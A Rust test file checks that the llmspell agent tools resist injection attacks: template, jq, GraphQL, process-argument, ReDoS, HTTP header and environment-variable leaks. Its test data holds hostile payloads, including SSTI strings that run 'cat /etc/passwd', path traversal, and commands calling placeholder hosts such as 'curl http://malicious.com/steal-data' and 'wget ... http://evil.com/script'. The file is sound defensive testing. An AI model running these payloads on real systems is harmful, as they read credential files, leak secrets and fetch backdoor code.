// ABOUTME: Injection attack tests for Task 2.10.2
// ABOUTME: Tests that tools are protected against various injection attacks

use llmspell_core::{
    traits::base_agent::BaseAgent,
    types::{AgentInput, ExecutionContext},
};
use llmspell_tools::{
    data::JsonProcessorTool,
    system::{EnvironmentReaderTool, ProcessExecutorTool},
    util::{DataValidationTool, TemplateEngineTool},
    GraphQLQueryTool, HttpRequestTool,
};
use serde_json::json;

#[tokio::test]
async fn test_template_engine_code_injection() {
    let template_tool = TemplateEngineTool::new();

    // Attempt various template injection attacks
    let injection_attempts = vec![
        // Tera template injection attempts
        (
            "{{ __import__('os').system('cat /etc/passwd') }}",
            json!({}),
        ),
        ("{{ config.items() }}", json!({})),
        ("{{ ''.__class__.__mro__[1].__subclasses__() }}", json!({})),
        (
            "{% for c in [].__class__.__base__.__subclasses__() %}{% endfor %}",
            json!({}),
        ),
        ("{{ get_env(name='SECRET_KEY') }}", json!({})),
        ("{{ range(10**10) }}", json!({})),
        // Path traversal in includes
        ("{% include '/etc/passwd' %}", json!({})),
        ("{% include '../../../etc/passwd' %}", json!({})),
    ];

    for (template, data) in injection_attempts {
        let input = AgentInput::text("render").with_parameter(
            "parameters",
            json!({
                "operation": "render",
                "template": template,
                "data": data
            }),
        );

        let result = template_tool
            .execute(input, ExecutionContext::default())
            .await;

        // Should either fail or not execute injected code
        if let Ok(output) = result {
            let response: serde_json::Value = serde_json::from_str(&output.text).unwrap();

            if response["success"].as_bool() == Some(true) {
                let rendered = response["result"]["rendered"].as_str().unwrap_or("");
                assert!(
                    !rendered.contains("root:")
                        && !rendered.contains("/bin/bash")
                        && !rendered.contains("SECRET")
                        && !rendered.contains("__class__"),
                    "Template injection not prevented for: {}",
                    template
                );
            }
        }
    }
}

#[tokio::test]
async fn test_json_processor_jq_injection() {
    let json_tool = JsonProcessorTool::new(Default::default());

    // Attempt jq injection attacks
    let injection_queries = vec![
        // Try to access environment
        "env",
        "$ENV",
        "env.SECRET_KEY",
        // Try to read files
        "include \"/etc/passwd\"",
        "import \"/etc/passwd\" as $f; $f",
        // Try infinite loops
        "while(true; .+1)",
        "recurse(.+1)",
        // Try to access internals
        ".__inputs",
        "debug",
    ];

    let test_data = json!({"foo": "bar", "num": 42});

    for query in injection_queries {
        let input = AgentInput::text("query").with_parameter(
            "parameters",
            json!({
                "operation": "query",
                "input": test_data,
                "query": query
            }),
        );

        let result = json_tool.execute(input, ExecutionContext::default()).await;

        // Should either fail or return safe results
        if let Ok(output) = result {
            let response_text = output.text.to_lowercase();
            assert!(
                !response_text.contains("/etc/passwd")
                    && !response_text.contains("secret")
                    && !response_text.contains("root:")
                    && !response_text.contains("api_key"),
                "JQ injection not prevented for query: {}",
                query
            );
        }
    }
}

#[tokio::test]
async fn test_graphql_query_injection() {
    let graphql_tool =
        GraphQLQueryTool::new(Default::default()).expect("Failed to create GraphQL tool");

    // GraphQL injection attempts
    let injections = vec![
        // Introspection attacks
        r#"{
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }"#,
        // Alias abuse
        r#"{
            a1: user(id: "1") { password }
            a2: user(id: "2") { password }
            a3: user(id: "3") { password }
        }"#,
        // Nested query explosion
        r#"{
            user {
                posts {
                    comments {
                        author {
                            posts {
                                comments {
                                    author {
                                        id
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }"#,
    ];

    for query in injections {
        let input = AgentInput::text("query").with_parameter(
            "parameters",
            json!({
                "operation": "query",
                "endpoint": "https://example.com/graphql",
                "query": query
            }),
        );

        let result = graphql_tool
            .execute(input, ExecutionContext::default())
            .await;

        // Should handle safely (likely fail due to no real endpoint)
        if let Ok(output) = result {
            let response: serde_json::Value =
                serde_json::from_str(&output.text).unwrap_or(json!({"success": false}));

            // Should not expose sensitive schema information
            if response["success"].as_bool() == Some(true) {
                let data = &response["result"]["data"];
                assert!(
                    !data.to_string().contains("password")
                        && !data.to_string().contains("secret")
                        && !data.to_string().contains("__schema"),
                    "GraphQL injection not prevented"
                );
            }
        }
    }
}

#[tokio::test]
async fn test_process_executor_argument_injection() {
    let process_tool = ProcessExecutorTool::new(Default::default());

    // Command argument injection attempts
    let dangerous_args = vec![
        vec!["echo", "test; cat /etc/passwd"],
        vec!["ls", "-la /etc/passwd"],
        vec!["grep", "-r", "password", "/"],
        vec!["find", "/", "-name", "*.key"],
        vec!["curl", "http://malicious.com/steal-data"],
        vec!["wget", "-O", "/tmp/backdoor.sh", "http://evil.com/script"],
    ];

    for args in dangerous_args {
        let input = AgentInput::text("execute").with_parameter(
            "parameters",
            json!({
                "operation": "execute",
                "command": args[0],
                "args": args[1..].to_vec()
            }),
        );

        let result = process_tool
            .execute(input, ExecutionContext::default())
            .await;

        // Should either fail or be restricted
        match result {
            Ok(output) => {
                let response: serde_json::Value =
                    serde_json::from_str(&output.text).unwrap_or(json!({"success": false}));

                if response["success"].as_bool() == Some(true) {
                    let stdout = response["result"]["stdout"].as_str().unwrap_or("");
                    assert!(
                        !stdout.contains("root:")
                            && !stdout.contains("password:")
                            && !stdout.contains(".key")
                            && !stdout.contains("malicious"),
                        "Process argument injection not prevented for: {:?}",
                        args
                    );
                }
            }
            Err(_) => {
                // Expected for dangerous commands
            }
        }
    }
}

#[tokio::test]
async fn test_data_validation_regex_dos() {
    let validator_tool = DataValidationTool::new();

    // ReDoS (Regular Expression Denial of Service) patterns
    let large_url = format!("http://{}", "a".repeat(100));
    let large_phone = "1".repeat(100);
    let dangerous_patterns = vec![
        // Email validation with ReDoS
        ("email", "aaaaaaaaaaaaaaaaaaaaaaaaaaaa@"),
        // URL validation with ReDoS
        ("url", large_url.as_str()),
        // Phone with repetitive patterns
        ("phone", large_phone.as_str()),
    ];

    for (validation_type, input_data) in dangerous_patterns {
        let input = AgentInput::text("validate").with_parameter(
            "parameters",
            json!({
                "operation": "validate",
                "data": input_data,
                "rules": {
                    "type": validation_type
                }
            }),
        );

        let start = std::time::Instant::now();
        let _result = validator_tool
            .execute(input, ExecutionContext::default())
            .await;
        let elapsed = start.elapsed();

        // Should complete quickly even with pathological input
        assert!(
            elapsed < std::time::Duration::from_millis(100),
            "Validation took too long for {}: {:?}",
            validation_type,
            elapsed
        );
    }
}

#[tokio::test]
async fn test_http_request_header_injection() {
    let http_tool = HttpRequestTool::new(Default::default()).expect("Failed to create HTTP tool");

    // HTTP header injection attempts
    let dangerous_headers = vec![
        ("User-Agent", "Mozilla/5.0\r\nX-Injected: malicious"),
        (
            "Referer",
            "http://example.com\r\nSet-Cookie: session=hijacked",
        ),
        (
            "X-Custom",
            "value\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1",
        ),
    ];

    for (header_name, header_value) in dangerous_headers {
        let input = AgentInput::text("request").with_parameter(
            "parameters",
            json!({
                "operation": "request",
                "method": "GET",
                "url": "http://httpbin.org/headers",
                "headers": {
                    header_name: header_value
                }
            }),
        );

        let result = http_tool.execute(input, ExecutionContext::default()).await;

        // Headers should be sanitized or request should fail
        if let Ok(output) = result {
            let response: serde_json::Value =
                serde_json::from_str(&output.text).unwrap_or(json!({"success": false}));

            if response["success"].as_bool() == Some(true) {
                let headers = &response["result"]["headers"];
                // Injected headers should not appear
                assert!(
                    !headers.to_string().contains("X-Injected")
                        && !headers.to_string().contains("Set-Cookie: session=hijacked"),
                    "Header injection not prevented"
                );
            }
        }
    }
}

#[tokio::test]
async fn test_environment_reader_information_leak() {
    let env_tool = EnvironmentReaderTool::new(Default::default());

    // Try to read sensitive environment variables
    let sensitive_vars = vec![
        "AWS_SECRET_ACCESS_KEY",
        "DATABASE_PASSWORD",
        "API_KEY",
        "PRIVATE_KEY",
        "SSH_PRIVATE_KEY",
        "GITHUB_TOKEN",
    ];

    for var in sensitive_vars {
        let input = AgentInput::text("read").with_parameter(
            "parameters",
            json!({
                "operation": "get",
                "key": var
            }),
        );

        let result = env_tool.execute(input, ExecutionContext::default()).await;

        // Should either fail or return sanitized/empty value
        if let Ok(output) = result {
            let response: serde_json::Value =
                serde_json::from_str(&output.text).unwrap_or(json!({"success": false}));

            if response["success"].as_bool() == Some(true) {
                let value = response["result"]["value"].as_str().unwrap_or("");
                assert!(
                    value.is_empty() || value == "***" || value == "[REDACTED]",
                    "Sensitive environment variable exposed: {}",
                    var
                );
            }
        }
    }
}
